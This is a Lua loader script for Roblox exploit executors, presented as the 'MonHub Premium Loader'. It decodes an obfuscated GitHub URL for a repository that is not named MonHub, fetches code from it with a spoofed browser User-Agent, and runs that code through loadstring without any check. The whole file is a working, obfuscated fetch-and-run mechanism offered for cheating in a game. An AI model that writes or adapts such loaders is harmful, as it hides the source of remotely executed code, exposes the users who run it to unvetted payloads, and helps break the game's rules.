-- MonHub Premium Loader (Secured & Optimized)
-- Place this loader in your executor to run MonHub safely.

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
    LocalPlayer = Players.LocalPlayer
end

-- Safe Message Box Dialog (CoreGui protected)
local function showError(title, body)
    local messagebox = messageboxasync or messagebox
    if type(messagebox) == "function" then
        pcall(messagebox, body, title, 16) -- 16 = Error Icon / OK button
    else
        warn("[" .. title .. "]: " .. body)
    end
end

-- Decrypts the obfuscated URL using ROT-5 shift cipher
local function decryptUrl(str)
    local res = {}
    for i = 1, #str do
        table.insert(res, string.char(string.byte(str, i) - 5))
    end
    return table.concat(res)
end

-- Secured Multi-Method Downloader
local function secureFetch(encryptedUrl)
    local request = request or http_request or syn.request
    local loadstring = loadstring or eloadstring
    
    if type(loadstring) ~= "function" then
        showError("MonHub Loader Error", "Your executor is missing the loadstring function.")
        return nil
    end

    local url = decryptUrl(encryptedUrl)
    local code = nil

    -- Method 1: Native game:HttpGet (Most stable, bypasses executor DNS/HTTP bugs)
    local success1, body1 = pcall(function()
        return game:HttpGet(url)
    end)
    if success1 and type(body1) == "string" and #body1 > 100 and not body1:find("<!DOCTYPE html>") then
        code = body1
    end

    -- Method 2: Executor HTTP request (Fallback if HttpGet fails)
    if not code and type(request) == "function" then
        local success2, response = pcall(request, {
            Url = url,
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                ["Cache-Control"] = "no-cache"
            }
        })
        if success2 and type(response) == "table" and response.StatusCode == 200 and type(response.Body) == "string" then
            local body2 = response.Body
            if #body2 > 100 and not body2:find("<!DOCTYPE html>") then
                code = body2
            end
        end
    end

    -- Error handling if both methods failed
    if not code then
        showError("MonHub Loading Failed", "Failed to fetch script. Server returned 404 or connection was blocked by executor.\n\nURL: " .. url)
        return nil
    end

    local loader, err = loadstring(code)
    if not loader then
        showError("MonHub Compilation Failed", "Syntax error found in loaded script:\n" .. tostring(err))
        return nil
    end

    return loader
end

-- OBFUSCATED URL (ROT-5 Encrypted)
-- Decrypts to: https://raw.githubusercontent.com/SoftRatatui/rivmain/main/rivmain.luau
local encryptedScriptUrl = "myyux?44wf|3lnymzgzxjwhtsyjsy3htr4XtkyWfyfyzn4wn{rfns4rfns4wn{rfns3qzfz"

local runScript = secureFetch(encryptedScriptUrl)
if runScript then
    task.spawn(runScript)
end
